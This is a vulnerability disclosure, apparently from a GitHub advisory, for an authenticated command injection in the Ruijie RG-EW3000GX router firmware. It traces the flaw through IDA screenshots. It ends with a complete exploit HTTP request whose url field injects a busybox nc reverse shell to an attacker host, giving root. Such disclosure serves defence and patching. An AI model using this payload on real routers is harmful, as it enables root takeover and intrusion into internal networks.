# Ruijie RG-EW3000GX

- Vendor：Ruijie
- Product：AX3000 Dual-Band Wi-Fi 6 Wireless Router
- Product Model：RG-EW3000GX
- Firmware Version：EW_3.0(1)B11P380,Release(12222219)
- Vulnerability Type：Authenticated Command Injection

# Description

A command injection vulnerability exists in the built-in plugin module `configChange` of the `unifyframe-sgi.elf` backend service on the Ruijie Reyee RG-EW3000GX router (firmware version EW_3.0(1)B11P380). The `cc_set` handler (at address 0x414D58) of the `configChange` module calls `uf_get_url_config`, which directly concatenates the attacker-controlled JSON field `data.url` into a shell command line and executes it via `popen()`. Since the web management interface only requires a valid admin session  (sid), any authenticated user can exploit this vulnerability to execute  arbitrary commands as root.



# Impact

An authenticated attacker can execute arbitrary commands with **root** privileges, leading to full compromise of the device (reading `/etc/rg_config/admin` ciphertext, dumping configs, installing persistent backdoors, pivoting into the internal network).



# Vulnerability Details

Load `/usr/sbin/unifyframe-sgi.elf` into IDA and locate the function `module_init_configChange`.

<img width="2070" height="877" alt="图片" src="https://github.com/user-attachments/assets/3b64f191-8609-47aa-8d5e-744ffa7fcc22" />


Look at a few key actions here: it sets the module name to `configChange`, and then binds it to **`sub_414D58`**. Double-click to enter.

<img width="2125" height="858" alt="图片" src="https://github.com/user-attachments/assets/223d736a-790e-4704-9b40-e69fccf15db8" />


Retrieve the values of the three parameters `url`, `module`, and `function`, and assign the value of `url` to a string.

<img width="2576" height="996" alt="图片" src="https://github.com/user-attachments/assets/3d2c81e5-21ae-414a-88d8-5e918465a4f2" />


Going further down here, it actually does a little bit of checking — it verifies whether `string` contains `$(` or backticks. Then it uses `snprintf` to concatenate the string, and finally passes it to `ufm_popen`, which is `popen`, to execute the command.

exp

```http
POST /cgi-bin/luci/api/cmd?auth=这里填认证后的token HTTP/1.1
Host: 10.44.77.254
Content-Length: 202
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
Origin: http://10.44.77.254
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{"method":"devConfig.set","params":{"module":"configChange","data":{
       "url":"http://127.0.0.1/\";busybox nc 10.44.77.10 4444 -e /bin/sh;\"",
       "module":"hostName","function":"dev_config"}}}
```

**Execution result**

<img width="2510" height="992" alt="图片" src="https://github.com/user-attachments/assets/e18a935d-525a-435d-ad9f-58ae3039af50" />


